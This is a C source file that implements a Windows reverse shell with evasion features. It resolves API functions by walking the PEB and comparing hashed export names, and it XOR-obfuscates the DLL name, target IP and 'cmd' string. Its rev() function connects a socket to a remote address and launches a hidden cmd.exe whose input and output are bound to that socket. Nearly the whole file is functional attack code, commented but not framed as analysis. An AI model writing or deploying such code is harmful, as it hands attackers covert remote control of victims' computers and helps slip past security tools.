#include "structs.h"
#include <stdio.h>
#include <inttypes.h>

#define LOADLIBRARYA_H 		1123600852
#define CREATEPROCESSA_H 	1053195260
#define WSASTARTUP_H    	1750926024
#define WSASOCKETA_H    	2909215252
#define HTONS_H        		2567088474   	 
#define INET_ADDR_H    		578114214
#define CONNECT_H       	3293380122

#define KEY1 0x94
#define KEY2 0x28
#define KEY3 0xaa

#define MEMSET(buf, val, len) 	for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)
#define LEN(s) 					({ const char *_p = (s); while (*_p) _p++; _p - (s); })
#define XOR(buf,k)				arr_noxor(buf, k)

#define LOSELOSE_HASH(s, hash) do {                   \
    (hash) = 0;                                       \
    const char *_p = (s);                             \
    int _c;                                           \
    while ((_c = (unsigned char)(*_p++))) {           \
        (hash) += _c;                                 \
        (hash) *= (_c + 3);                           \
    }                                                 \
} while (0)

static inline unsigned char xor_noxor(unsigned char x, unsigned char y) {
    return (x | y) & ~(x & y);  // Equivalent to x ^ y
}

void arr_noxor(char* buf, unsigned char key) {
    for (size_t i = 0; i < LEN(buf); i++) {
        buf[i] = xor_noxor(buf[i], key);
    }
}

// Get Function Address via PEB Walk
HMODULE GetFuncAddr(DWORD64 FuncHash) {    
	PIMAGE_EXPORT_DIRECTORY ExportDir;
	DWORD FuncNumber, Hash, i;    
	PDWORD FuncNameBase;
	PCSTR FuncName;
	WORD OrdinalIndex;

	PPEB PebAddress = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
	PPEB_LDR_DATA2 Ldr = (PPEB_LDR_DATA2) PebAddress->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
	PLIST_ENTRY NextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
	PLDR_DATA_TABLE_ENTRY2 DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) NextModule;	 
	while (DataTableEntry->DllBase != NULL) {    
    	DWORD64 ModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
    	PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS) ( ModuleBase + ((PIMAGE_DOS_HEADER) ModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
    	DWORD ExportDirRVA = NTHeader->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
    	if (ExportDirRVA == 0) {
        	continue;
    	}    
    	ExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) ModuleBase + ExportDirRVA); // Get a pointer to the actual export directory table.
    	FuncNumber = ExportDir->NumberOfNames;
    	FuncNameBase = (PDWORD) ((PCHAR) ModuleBase + ExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
    	for (i = 0; i < FuncNumber; i++) {
        	FuncName = (PCSTR) (*FuncNameBase + (DWORD64) ModuleBase);
        	FuncNameBase++;    
        	LOSELOSE_HASH(FuncName, Hash);    
        	if (Hash == FuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
            	OrdinalIndex = *(PWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfNameOrdinals) + (2 * i));
            	return (HMODULE) ((DWORD64) ModuleBase + *(PDWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfFunctions) + (4 * OrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
        	}
    	}
	}
	return NULL;
}

typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR lpcBuffer);
typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef int (WINAPI* WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);
typedef SOCKET (WINAPI* WSASOCKETA)(int af, int type, int protocol, WSAPROTOCOL_INFOA* lpProtocolInfo, DWORD g, DWORD dwFlags);
typedef u_short (WINAPI* HTONS)(u_short hostshort);
typedef unsigned long (WINAPI* INET_ADDR)(const char* cp);
typedef int (WINAPI* CONNECT)(SOCKET s, struct sockaddr* name, int namelen);

void rev() {
    
	int port = 1234 ;
	char ip[] = {0x9b,0x98,0x9d,0x84,0x9a,0x84,0x9a,0x84,0x9b, 0xaa};
	
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
	char ws2_32_dll[] = {0xe3, 0xe7, 0xa6, 0xcb, 0xa7, 0xa6, 0xba, 0xf0, 0xf8, 0xf8, 0x94};

	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
	//	 cmd	  0x63, 0xcd, 0x64, key
	char cmd[] = {0x4b, 0x45, 0x4c, 0x28};
	
	UINT64 pLoadLibraryA = (UINT64)GetFuncAddr(LOADLIBRARYA_H);	// Get function addresses 
	UINT64 pCreateProcessA = (UINT64)GetFuncAddr(CREATEPROCESSA_H);   
	XOR(ws2_32_dll, KEY1); ((LOADLIBRARYA)pLoadLibraryA)(ws2_32_dll);
	UINT64 pWsaStartup = (UINT64)GetFuncAddr(WSASTARTUP_H);
	UINT64 pWsaSocketA = (UINT64)GetFuncAddr(WSASOCKETA_H);
	UINT64 pHtons = (UINT64)GetFuncAddr(HTONS_H);
	UINT64 pInet_addr = (UINT64)GetFuncAddr(INET_ADDR_H);
	UINT64 pConnect = (UINT64)GetFuncAddr(CONNECT_H);

	WSADATA wsadata; // winsock struct declarations
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	struct sockaddr_in sa;
	
	((WSASTARTUP)pWsaStartup)(MAKEWORD(2, 2), &wsadata); // required before using winsock
	SOCKET socket = ((WSASOCKETA)pWsaSocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // creates the socket
	sa.sin_family = AF_INET;
	sa.sin_port = ((HTONS)pHtons)(port);
	XOR(ip, KEY3); sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(ip); // sets sa fields
	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); // perform the connection
	size_t siLen = sizeof(si);
	MEMSET(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
	si.cb = siLen;
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)socket;
	si.hStdOutput = (HANDLE)socket;
	si.hStdError = (HANDLE)socket;
	XOR(cmd, KEY2); ((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launches shell bound for socket
    
}
